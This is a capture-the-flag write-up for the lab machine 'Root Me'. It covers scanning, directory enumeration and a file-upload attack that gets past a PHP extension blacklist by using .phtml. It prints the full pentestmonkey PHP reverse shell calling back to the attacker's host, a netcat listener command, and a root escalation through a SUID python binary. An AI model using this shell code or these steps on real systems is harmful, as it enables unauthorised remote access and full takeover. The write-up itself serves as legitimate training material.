Root Me (Rewritten)

Target IP: 10.10.88.208
Challenge Description: A ctf for beginners, can you root me?

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.88.208 -p- returns the result shown above. By the looks of it, there are two TCP ports open on the target machine: SSH and HTTP on their standard ports. I will perform an aggressive scan against these two ports to identify its applications.


I performed an aggressive scan using the command sudo nmap -sV -A 10.10.88.208 -p 22,80 and obtained the result shown above. The web application on port 80 seems the most interesting to me, and I will enumerate that application first. I do not have any credentials to target the SSH. I performed further scan against the web server using tools such as whatweb and nikto, but I did not find anything important.

Enumeration

Port 80: HTTP

The webpage above is returned for this web application. I viewed the source-code of the webpage, but I did not find anything useful. Time to perform a directory search now.


I performed a directory search using the command gobuster dir -u http://10.10.88.208/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,pdf and obtained the result shown above. Two directories stand out to me: /uploads and /panel.


I checked /uploads, and the webpage above was returned to me. I was hoping to find any interesting files, but I did not find anything. If I have access to file upload, maybe I can access my uploaded files? Other than that, I found the web server is running Apache/2.4.29 as shown above. Time to check the other directory now.


I checked the /panel page over at http://10.10.88.208/panel, and the webpage above was returned to me. I notice this is a file upload page. If the web application is vulnerable to file upload attack, I can upload a malicious file and access it; for example, uploading a PHP webshell to perform Remote Code Execution (RCE) & obtain a reverse shell connection from the web server. Since the web server is running Apache, it uses PHP.


To test the file upload, I created a simple text file with the name simple.txt that contains the message Hello, world!. And bingo, I was able to successfully upload it as shown above. Can I access this uploaded file now?


To check the uploaded file, I browsed to /uploads and I was able to access the test.txt as shown above. Time to upload a malicious PHP file now. I tried to upload a simple PHP file, but I was unable to do so. The web application is using blacklist filtering in place, as .php extension was not allowed. Time to bypass this filtering in place.

Exploitation

Foothold: Owning the /panel via File Upload Attack & Bypassing the Blacklist PHP Extension Filtering

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.14.87.142';
$port = 8443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>

I checked to see if the filtering was performed on the client-side (on my browser), but it was not. It looks like the extension checking is performed by the server on the backend. But time to bypass this. There are multiple ways to bypass the blacklist filtering in place. One way is to take advantage of the different file extensions; for example, instead of uploading .php file, we can try to upload .phar, .phtml, .php8, etc. That is one of the disadvantage of blacklist filtering, as all PHP extensions have to be checked. Otherwise, we can easily upload a malicious PHP extension that is not checked. Most web server do use filter the uncomming extensions such as .phar and .phtml. On my machine, I created a file with the name sh3ll.phtml that contains the code shown above. This code, PHP Pentest Monkey, will launch a reverse shell connection to my machine at port 8443.


And bingo. The malicious PHP file with the extension .phtml was uploaded successfully as shown above. Time to start a listener on my machine and launch the script. I started a listener on my machine on port 8443 using the command nc -lvnp 8443.


I browsed to http://10.10.88.208/uploads and clicked on the sh3ll.phtml malicious file. And instantly, I obtained a reverse shell connection from the web server to my machine at port 8443 as shown above. Now I have a foothold on the target machine as the user www-data. Time to elevate my privileges.

Privilege Escalation

Vertical Privilege Escalation: www-data user to root user via SUID Abuse PE via /usr/bin/python


After landing a shell on the target machine, I browsed to /var/www. That's where I found the user.txt flag. I also found the file .bash_history owned by the www-data user. Running cat .bash_history outputs the commands history shown above. The commands history is interesting as the hint is find / -perm /4000. This user tried to find all binaries that have SUID bit set. Maybe I can find one too? The command python -c 'import os; os.execl("/bin/sh", "sh", "-p")' also gives it away, as this command is used to open default shell with elevated privileges.


And yep. Running the command find / -perm -u=s -type f 2>/dev/null returns the result shown above. It looks like /usr/bin/python has SUID bit set. Now I can renter the same command python -c 'import os; os.execl("/bin/sh", "sh", "-p")' to spawn a root shell and obtain root privileges on the target machine :)


I entered the same command python -c 'import os; os.execl("/bin/sh", "sh", "-p")' to spawn a root shell, as shown above. Now I have root access on the target machine.
